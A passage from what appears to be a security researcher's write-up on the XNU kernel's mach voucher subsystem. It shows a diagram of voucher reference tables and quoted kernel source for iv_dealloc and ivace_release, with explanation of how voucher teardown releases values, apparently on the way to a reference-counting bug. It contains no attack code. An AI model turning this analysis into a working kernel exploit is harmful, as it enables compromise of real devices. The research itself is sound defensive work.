 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_refs &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;reference&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;counted &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;into&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;user_data controller&amp;#39;s ivac_table&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;controller &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ivace_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_refs &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;pointer to user_data_value_element&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_value_element &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; e_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; e_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Let&amp;#39;s look at what happens when we drop the only send right to the voucher port and the voucher gets deallocated.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;We&amp;#39;ll skip analysis of the mach port part; essentially, once all the send rights to the mach port holding a reference to the voucher are deallocated &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;will get called to drop its reference on the voucher. And if that was the last reference &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_dealloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;and we&amp;#39;ll pick up the code there:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.4b28abaa66e9cfb4075064152109c5280c8cf0e2&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.40&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_dealloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ipc_voucher_t iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;boolean_t unhash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_dealloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;removes the voucher from the hash table, destroys the mach port associated with the voucher (if there was one) then releases a reference on each value index in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.4f3ea1be5aeabd748f89b7dfdb88c89a35820b48&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.41&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;i &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;]);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Recall that the index in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the &amp;quot;key index&amp;quot;, which is one less than the key, which is why &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;i&lt;/span&gt;&lt;span&gt;&amp;nbsp;is being passed to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_release&lt;/span&gt;&lt;span&gt;. The value in &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;alone is meaningless without knowing under which index it was stored in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span&gt;. Here&amp;#39;s the start of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.3340385800b70e69984ecec61cc53f34e8b57d23&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.42&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivgt_lookup&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* cant release persistent values */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_persist&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span 